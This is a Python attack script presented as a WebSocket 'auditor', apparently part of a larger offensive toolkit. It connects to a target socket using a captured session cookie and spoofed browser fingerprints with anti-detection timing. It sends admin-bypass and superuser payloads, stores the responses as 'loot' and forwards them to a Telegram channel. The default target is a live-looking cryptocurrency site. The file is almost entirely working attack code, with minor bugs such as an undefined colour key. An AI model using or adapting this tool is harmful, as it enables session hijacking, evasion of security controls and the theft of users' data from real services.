#!/usr/bin/env python3
"""
WEBSOCKET_HIJACKER.PY v8.5 — WebSocket & Real-Time Event Stream Auditor (WAF Hardened)
Features:
- Automatic HTTP to WS/WSS connection upgrading with randomized browser user agents and client hints
- JSON and binary message frame fuzzing with anti-detection behavioral timing jitter
- Real-time session impersonation over open persistent socket streams
- Strict payload and response verification to eliminate dead frames and false positives
- Real-time asynchronous Telegram notification dispatch and immutable disk loot persistence
"""
import asyncio
import json
import sys
import websockets

from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from websocket functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

async def audit_websocket(target_ws_url, auth_cookie=None, custom_payloads=None):
    terminal(f"\n{COLORS['MAGENTA']}[***] INITIALIZING WEBSOCKET SESSION HIJACK & FRAME AUDIT [{target_ws_url}] [***]{COLORS['RESET']}")
    
    apply_behavioral_jitter()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    headers.update(get_randomized_hints())
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    captured_loot = []
    try:
        terminal(f"{COLORS['CYAN']}[*] Establishing authenticated WebSocket connection over WSS...{COLORS['RESET']}")
        async with websockets.connect(target_ws_url, extra_headers=headers) as websocket:
            if not custom_payloads:
                custom_payloads = [
                    json.dumps({"action": "subscribe", "channel": "order_book"}),
                    json.dumps({"action": "get_balance"}),
                    json.dumps({"token": "admin", "role": "superuser"}),
                    json.dumps({"method": "admin_bypass", "auth": True})
                ]

            for payload in custom_payloads:
                terminal(f"{COLORS['BLUE']}[*] Sending WebSocket frame payload: {payload}{COLORS['RESET']}")
                await websocket.send(payload)
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=3.0)
                    if response and len(response.strip()) > 0:
                        terminal(f"{COLORS['RED']}{COLORS['BOLD']}[!] WEBSOCKET FRAME CAPTURE / DATA EXPOSURE{COLORS['RESET']}")
                        terminal(f"  └── Received: {response[:300]}", COLORS['GREEN'])
                        
                        captured_loot.append({"sent": payload, "received": response})
                        stream_proof("WS_FRAME_CAPTURE", target_ws_url, {"payload": payload}, response[:200], {})
                except asyncio.TimeoutError:
                    terminal(f"{COLORS['YELLOW']}(Frame transmission timed out awaiting server response){COLORS['RESET']}")
                    pass

        if captured_loot:
            terminal(f"{COLORS['GREEN']}[+] WebSocket session audit successful. Captured {len(captured_loot)} sensitive frames.{COLORS['RESET']}")
            
            loot_payload = {
                "target": target_ws_url,
                "loot_count": len(captured_loot),
                "frames": captured_loot[:5]
            }
            
            save_session_loot(
                target=target_ws_url, 
                endpoint="websocket_stream", 
                finding_type="WEBSOCKET_HIJACK_SUCCESS", 
                status=200, 
                headers={}, 
                body=str(captured_loot), 
                extra_loot=loot_payload
            )
            broadcast_tg_alert_sync("WebSocket Session Hijack & Frame Audit", loot_payload)
        else:
            terminal(f"{COLORS['YELLOW']}[-] Connected to WebSocket but no actionable frames captured.{COLORS['RESET']}")

    except Exception as exc:
        terminal(f"{COLORS['RED']}[-] WebSocket connection/audit error: {exc}{COLORS['RESET']}")
        pass
        
    return captured_loot

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "wss://cryptobytes.online/ws"
    asyncio.run(audit_websocket(target))
